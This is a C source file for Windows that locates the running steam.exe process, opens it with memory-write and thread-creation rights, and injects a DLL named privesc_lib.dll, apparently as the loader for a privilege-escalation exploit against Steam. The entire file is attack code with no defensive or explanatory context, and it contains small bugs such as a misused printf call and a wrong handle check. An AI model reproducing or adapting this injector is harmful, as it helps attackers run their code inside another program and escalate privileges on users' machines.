#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#include "process/process.h"

#define REQUIRED_RIGHTS PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |         \
                        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ

int main(int argc, char **argv) {
  char full_path[MAX_PATH] = {0};
  HANDLE steam;
  DWORD pid;
  
  if (argc < 2) {
    printf("No arguments received, presuming dll path to be ./privesc_lib.dll\n"
           "If you wish to specify a full path, use: %s <full_path_to_dll>\n",
           argv[0]);    
  } else {
    errno_t strcpy_errno = strncpy_s(full_path, MAX_PATH, argv[1], _TRUNCATE);
    if (STRUNCATE == strcpy_errno) {
      printf(stderr, "Dll path provided was too large for MAX_PATH\n");
      return EXIT_FAILURE;
    }
  }  

  pid = get_pid_from_name_tlhelp(TEXT("steam.exe"));
  if (!pid) {
    fprintf(stderr, "steam.exe is not running\n");
    return EXIT_FAILURE;
  }

  printf("Found steam with pid %d\n", pid);
  steam = OpenProcess(REQUIRED_RIGHTS, FALSE, pid);
  if (steam == INVALID_HANDLE_VALUE) {
    fprintf(stderr, "Could not OpenProcess steam.exe (%d)\n", GetLastError());
    return EXIT_FAILURE;
  }
  if (argc < 2) {
    int last, i;
    GetModuleFileNameA(NULL, full_path, MAX_PATH);
    for (last = 0, i = 0; full_path[i]; i++) {
      if (full_path[i] == '\\')
        last = i;
    }
    full_path[last + 1] = '\0';
    strcat_s(full_path, MAX_PATH, "privesc_lib.dll");
  }

  if (!inject_dll_loadlibrary(steam, full_path)) {
    fprintf(stderr, "Could not inject dll into steam.exe (%d)\n",
            GetLastError());
    return EXIT_FAILURE;
  }

  CloseHandle(steam);
  return EXIT_SUCCESS;
}